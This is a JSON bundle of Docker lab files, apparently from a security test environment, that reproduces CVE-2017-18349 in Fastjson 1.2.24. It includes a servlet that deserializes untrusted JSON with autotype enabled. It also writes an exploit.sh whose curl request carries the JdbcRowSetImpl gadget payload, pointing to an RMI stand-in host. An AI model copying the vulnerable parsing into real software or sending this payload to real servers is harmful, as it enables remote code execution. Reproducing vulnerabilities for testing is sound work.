{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-18349/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable_app:\n    build: .\n    ports:\n      - \"8080:8080\"\n    environment:\n      - VULN_MODE=exploit\n    restart: unless-stopped\n    command: [\"catalina.sh\", \"run\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2017-18349/custom_no_tool/Dockerfile",
            "content": "FROM tomcat:9.0-jdk8-openjdk-slim\nLABEL maintainer=\"security@example.com\"\n\n# Install utilities needed for the demonstration\nRUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\n\n# Download a vulnerable version of Fastjson (1.2.24)\nRUN curl -L -o /usr/local/tomcat/lib/fastjson-1.2.24.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24.jar\n\n# Add Java source that uses Fastjson\nRUN mkdir -p /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example\nCOPY ExploitDemo.java /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java\n\n# Compile the Java source against Tomcat's servlet API and Fastjson\nRUN javac -classpath /usr/local/tomcat/lib/servlet-api.jar:/usr/local/tomcat/lib/fastjson-1.2.24.jar \\\n    /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java && \\\n    rm /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java\n\n# Add a minimal web.xml to map the servlet\nCOPY web.xml /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml\n\n# Add an exploit script for testing purposes only (not executed by default)\nRUN printf '#!/bin/sh\\necho \"Attempting to trigger CVE-2017-18349...\"\\ncurl -X POST -d \"{\\\\\\\"@type\\\\\\\":\\\\\\\"com.sun.rowset.JdbcRowSetImpl\\\\\\\",\\\\\\\"dataSourceName\\\\\\\":\\\\\\\"rmi://malicious-host/Exploit\\\\\\\",\\\\\\\"autoCommit\\\\\\\":true}\" http://localhost:8080/trigger\\n' > /exploit.sh && chmod +x /exploit.sh\n\nEXPOSE 8080\n"
        },
        {
            "location": "./../../dockers/CVE-2017-18349/custom_no_tool/ExploitDemo.java",
            "content": "package com.example;\n\nimport com.alibaba.fastjson.JSON;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class ExploitDemo extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        // Read raw JSON payload\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = req.getReader().readLine()) != null) {\n            sb.append(line);\n        }\n        String json = sb.toString();\n        try {\n            // Use Fastjson with auto type enabled (default) to parse the payload\n            Object obj = JSON.parseObject(json, Object.class);\n            resp.setContentType(\"text/plain\");\n            PrintWriter out = resp.getWriter();\n            out.println(\"Parsed object: \" + obj);\n        } catch (Exception e) {\n            resp.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Parsing failed: \" + e.getMessage());\n        }\n    }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2017-18349/custom_no_tool/web.xml",
            "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\"\n         version=\"3.1\">\n    <servlet>\n        <servlet-name>ExploitDemo</servlet-name>\n        <servlet-class>com.example.ExploitDemo</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>ExploitDemo</servlet-name>\n        <url-pattern>/trigger</url-pattern>\n    </servlet-mapping>\n</web-app>\n"
        }
    ],
    "directory_tree": "./../../dockers/CVE-2017-18349/custom_no_tool"
}